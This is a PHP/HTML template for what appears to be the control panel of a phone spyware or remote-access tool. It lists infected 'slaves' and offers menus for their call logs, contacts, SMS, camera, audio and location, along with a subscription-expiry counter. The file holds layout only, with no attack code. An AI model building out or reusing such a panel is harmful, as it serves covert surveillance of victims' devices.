<style>
    .main-card {
        display: inline-block;
        background: white;
        box-sizing: border-box;
        width: auto;
        margin-top: 8px;
        margin-left: 8px;
        padding: 16px;
        border-radius: 2px;
        font-family: 'Roboto';
        color: black;
        height: auto;
    }
</style>

<body fullbleed style="font-family: 'Roboto', sans-serif;">

    <core-scaffold>

        <core-toolbar tool flex>
            <div flex id="title" style="font-size: 24px;"></div>




            <paper-icon-button icon="home" id="home_button"></paper-icon-button>
            <paper-icon-button icon="refresh" id="refresh_button"></paper-icon-button>


            </template>

        </core-toolbar>


        <div navigation>


            <core-toolbar>

                <img src="<?= base_url('assets/web/avatar.png')?>" height=50px width=50px style="margin-top:55px;" />
                <name style="color:white;margin-top:30px;">
                    <?=$this->session->userdata("username") ; ?></name>
                <paper-icon-button icon="exit-to-app" id="logout_button" style="color:white;margin-left:auto;"></paper-icon-button>
            </core-toolbar>


        </div>
        <core-scroll-header-panel navigation flex>
            <core-menu navigation style="margin-top:40px;">


                <?php foreach($slaves as $u){ echo "
                  
                  <core-submenu icon='social:person' label='{$u->device}'>
                  <core-item icon='communication:call' label='Call Logs' class='calllogs'></core-item>
                  <core-item icon='communication:contacts' label='Contacts' class='contacts'></core-item>
                  <core-item icon='communication:message' label='Messages' class='sms'></core-item>
                  <core-item icon='image:camera' label='Camera' class='camera'></core-item>
                  <core-item icon='image:audiotrack' label='Audio' class='audio'></core-item>
                  <core-item icon='maps:my-location' label='Location' class='location'></core-item>
                  <core-item icon='social:cake' label='Extras' class='extras'></core-item>
                  
            </core-submenu>"; } ?>



            </core-menu>
        </core-scroll-header-panel>


        <!--<paper-progress id="progress" style="width:100%; display:block;background-color: #f8bbd0 ;" value="10" indeterminate="true"></paper-progress>-->
        <paper-spinner active=false></paper-spinner>
        <div id="container">
            <paper-shadow class="main-card">
                Days to expiry : 20

                <br>
                <paper-progress value="20" min="0" max="30"></paper-progress>

            </paper-shadow>
            <paper-shadow class="main-card">
                Number of slaves : 2

                <br>
                <paper-progress value="2" min="0" max="100"></paper-progress>

            </paper-shadow>
      
        </div>

    </core-scaffold>









</body>